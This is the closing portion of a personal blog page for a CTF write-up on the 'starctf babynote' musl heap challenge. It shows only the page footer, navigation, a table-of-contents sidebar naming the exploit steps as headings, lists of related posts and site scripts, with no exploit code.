+      <div class="tags">
+          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-04-22 20:34:49" itemprop="dateModified" datetime="2022-04-22T20:34:49+08:00">2022-04-22</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/04/19/starctf-babynote/" title="starctf_babynote">http://example.com/2022/04/19/starctf-babynote/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/04/18/starctf_examination/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeubcbajj20zk0m8h1h.jpg" title="examination">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> pwn</span>
+  <h3>examination</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/04/25/MRCTF-ezbash/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicitf0kl1j20zk0m87fe.jpg" title="MRCTF_ezbash">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> pwn</span>
+  <h3>MRCTF_ezbash</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#starctfbabynote-musl122"><span class="toc-number">1.</span> <span class="toc-text"> starctf	babynote musl1.2.2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%BB%A5%E5%8F%8A%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text"> 环境以及保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E7%B4%A2%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 探索的过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#add"><span class="toc-number">1.2.1.</span> <span class="toc-text"> add</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find"><span class="toc-number">1.2.2.</span> <span class="toc-text"> find</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete"><span class="toc-number">1.2.3.</span> <span class="toc-text"> delete</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text"> 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 泄露 libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%85%B6%E4%BB%96%E5%9C%B0%E5%9D%80meta"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 泄露其他地址（meta）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 任意地址写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#meta%E7%9A%84-%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.3.1.</span> <span class="toc-text"> meta 的 结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">1.3.3.2.</span> <span class="toc-text"> 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fsop"><span class="toc-number">1.3.3.3.</span> <span class="toc-text"> FSOP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">1.4.</span> <span class="toc-text"> 完整 exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> 参考链接</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2022/03/19/pwnable-seethefile/" rel="bookmark" title="pwnable_seethefile">pwnable_seethefile</a></li><li><a href="/2022/03/20/buuoj-heapcreator/" rel="bookmark" title="buuoj_heapcreator">buuoj_heapcreator</a></li><li><a href="/2022/03/21/roarctf-2019-easypwn/" rel="bookmark" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></li><li><a href="/2022/03/22/tw2017parrot/" rel="bookmark" title="tw2017parrot">tw2017parrot</a></li><li><a href="/2022/04/01/note-file/" rel="bookmark" title="note_file">note_file</a></li><li><a href="/2022/04/01/tcache-tear/" rel="bookmark" title="tcache_tear">tcache_tear</a></li><li><a href="/2022/04/10/pwnable-bookwriter/" rel="bookmark" title=""></a></li><li><a href="/2022/04/14/heap-paradise/" rel="bookmark" title="heap_paradise">heap_paradise</a></li><li><a href="/2022/04/18/starctf_examination/" rel="bookmark" title="examination">examination</a></li><li class="active"><a href="/2022/04/19/starctf-babynote/" rel="bookmark" title="starctf_babynote">starctf_babynote</a></li><li><a href="/2022/04/25/MRCTF-ezbash/" rel="bookmark" title="MRCTF_ezbash">MRCTF_ezbash</a></li><li><a href="/2022/05/10/chunzhiIOT/" rel="bookmark" title="chunzhiIOT">chunzhiIOT</a></li><li><a href="/2022/05/10/torghast/" rel="bookmark" title="torghast">torghast</a></li><li><a href="/2022/05/13/pwnable-re-alloc/" rel="bookmark" title="pwnable-re-alloc">pwnable-re-alloc</a></li><li><a href="/2022/06/18/ciscn2022-syscall/" rel="bookmark" title="ciscn2022_syscall">ciscn2022_syscall</a></li><li><a href="/2022/06/19/ciscn-2022-popcalc/" rel="bookmark" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></li><li><a href="/2022/06/20/ciscn-2022-planecoode/" rel="bookmark" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></li><li><a href="/2022/09/20/tctf2022ezvm/" rel="bookmark" title="tctf2022ezvm">tctf2022ezvm</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="dreamcat"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">dreamcat</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">33</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/04/18/starctf_examination/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/04/25/MRCTF-ezbash/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/01/note-file/" title="note_file">note_file</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="vm学习笔记">vm学习笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/03/20/buuoj-heapcreator/" title="buuoj_heapcreator">buuoj_heapcreator</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/01/tcache-tear/" title="tcache_tear">tcache_tear</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/06/slab%E3%80%81slub%E3%80%81slob%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="slab、slub、slob学习记录">slab、slub、slob学习记录</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="滴水逆向_学习笔记">滴水逆向_学习笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/14/heap-paradise/" title="heap_paradise">heap_paradise</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/09/20/tctf2022ezvm/" title="tctf2022ezvm">tctf2022ezvm</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/" title="逆向常见算法">逆向常见算法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/03/21/roarctf-2019-easypwn/" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="Symbols count total">282k words</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="Reading time total">4:16</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/04/19/starctf-babynote/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)dreamcat?"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
